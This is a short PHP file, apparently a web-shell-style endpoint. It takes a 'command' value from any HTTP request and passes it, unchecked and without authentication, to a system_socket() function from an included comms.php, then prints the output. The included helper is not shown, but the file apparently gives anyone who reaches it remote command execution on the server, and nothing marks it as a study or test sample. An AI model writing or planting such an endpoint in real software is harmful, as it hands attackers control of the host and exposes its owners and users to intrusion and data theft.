<?php

    /*
    Copyright (c) Rafael Sánchez
    */

    include 'comms.php';

    $command = $_REQUEST["command"];
    echo system_socket( $command );

?>
